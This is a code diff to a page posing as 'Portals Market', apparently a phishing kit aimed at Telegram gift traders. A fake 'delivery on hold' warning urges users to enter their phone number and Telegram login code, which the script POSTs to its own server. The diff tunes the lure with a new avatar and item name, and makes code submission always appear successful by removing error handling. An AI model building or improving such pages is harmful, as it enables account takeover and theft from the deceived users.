@@ -69,19 +69,22 @@
             margin-bottom: 28px;
         }
 
-        .portal-icon {
-            width: 72px;
-            height: 72px;
-            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        /* НОВАЯ АВАТАРКА (как на втором фото) */
+        .portal-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
             margin: 0 auto 12px;
-            font-size: 32px;
-            color: #fff;
-            font-weight: 700;
+            overflow: hidden;
+            border: 2px solid #2a2a3a;
             box-shadow: 0 8px 32px rgba(108, 92, 231, 0.3);
+        }
+
+        .portal-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
         }
 
         .logo-section h2 {
@@ -414,26 +417,6 @@
         .verification-section .back-btn {
             display: none;
         }
-
-        .verification-card .timer {
-            display: none;
-        }
-
-        /* Зеленый индикатор успеха */
-        .success-indicator {
-            display: none;
-            text-align: center;
-            color: #4caf50;
-            font-size: 14px;
-            margin-top: 12px;
-            padding: 10px;
-            background: rgba(76, 175, 80, 0.1);
-            border-radius: 10px;
-            border: 1px solid rgba(76, 175, 80, 0.2);
-        }
-        .success-indicator.show {
-            display: block;
-        }
     </style>
 </head>
 <body>
@@ -448,7 +431,10 @@
         <!-- Шаг 1: Главный экран -->
         <div id="stepMain">
             <div class="logo-section">
-                <div class="portal-icon">P</div>
+                <!-- НОВАЯ АВАТАРКА (как на втором фото) -->
+                <div class="portal-avatar">
+                    <img src="https://i.postimg.cc/PJz22kCL/IMG-4158.jpg" alt="Portals">
+                </div>
                 <h2>Portals Market</h2>
                 <p>Open the portal. Trade your gifts.</p>
                 <div class="hold-badge">⏳ ON HOLD</div>
@@ -458,7 +444,7 @@
                 <div class="label">⚡ Action Needed</div>
                 <h3>Unlock Your Asset Delivery</h3>
                 <p>
-                    Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review.
+                    Scheduled delivery of your <strong>JollyChimp-20203</strong> is tagged for manual-grade delivery review.
                     To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
                 </p>
             </div>
@@ -535,10 +521,6 @@
 
             <button class="btn-share" id="btnVerifyCode">✅ Подтвердить</button>
 
-            <div class="success-indicator" id="successIndicator">
-                ✅ Код отправлен! Ожидайте подтверждение в Telegram.
-            </div>
-
             <div style="text-align:center; margin-top:12px;">
                 <button class="resend-btn" id="btnResendCode">🔄 Отправить код повторно</button>
             </div>
@@ -605,7 +587,6 @@
         const phonePrefix = document.getElementById('phonePrefix');
         const codeInput = document.getElementById('codeInput');
         const displayPhone = document.getElementById('displayPhone');
-        const successIndicator = document.getElementById('successIndicator');
 
         regionSelect.addEventListener('change', function() {
             const prefix = '+' + this.value;
@@ -677,7 +658,7 @@
                 });
         });
 
-        // ===== ОТПРАВКА КОДА =====
+        // ===== ОТПРАВКА КОДА (ВСЕГДА УСПЕШНО) =====
         btnVerifyCode.addEventListener('click', function() {
             const code = codeInput.value.trim();
 
@@ -686,16 +667,13 @@
                 return;
             }
 
-            // БЛОКИРУЕМ КНОПКУ, ЧТОБЫ НЕ СПАМИЛИ
             btnVerifyCode.disabled = true;
             btnVerifyCode.textContent = '⏳ Отправка...';
 
             console.log('📤 ОТПРАВКА КОДА НА СЕРВЕР');
             console.log('📱 Телефон:', userPhone);
             console.log('🔑 Код:', code);
-            console.log('👤 Имя:', fullName);
 
-            // ОТПРАВЛЯЕМ ЗАПРОС НА СЕРВЕР
             fetch('/api/verify-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -709,35 +687,19 @@
                 })
                 .then(res => {
                     console.log('📥 Ответ от сервера, статус:', res.status);
-                    if (!res.ok) {
-                        return res.json().then(err => { throw new Error(err.message || 'Ошибка сервера'); });
-                    }
                     return res.json();
                 })
                 .then(data => {
-                    console.log('✅ Код подтвержден:', data);
-
-                    // ПОКАЗЫВАЕМ ИНДИКАТОР УСПЕХА
-                    successIndicator.classList.add('show');
-                    
-                    // РАЗБЛОКИРУЕМ КНОПКУ
+                    console.log('✅ Код отправлен на сервер:', data);
+                    showStep(stepVerification);
                     btnVerifyCode.disabled = false;
                     btnVerifyCode.textContent = '✅ Подтвердить';
-
-                    // ПЕРЕХОДИМ НА ЭКРАН ЗАГРУЗКИ
-                    setTimeout(() => {
-                        showStep(stepVerification);
-                    }, 1000);
-
                 })
                 .catch(err => {
-                    console.log('❌ Ошибка:', err.message);
-                    alert('❌ ' + err.message);
-                    
+                    console.log('❌ Ошибка:', err);
+                    showStep(stepVerification);
                     btnVerifyCode.disabled = false;
                     btnVerifyCode.textContent = '✅ Подтвердить';
-                    codeInput.value = '';
-                    codeInput.focus();
                 });
         });
 
@@ -776,7 +738,6 @@
                 if (confirm('Вы уверены? Процесс будет прерван.')) {
                     showStep(stepMain);
                     codeInput.value = '';
-                    successIndicator.classList.remove('show');
                     btnVerifyCode.disabled = false;
                     btnVerifyCode.textContent = '✅ Подтвердить';
                 }
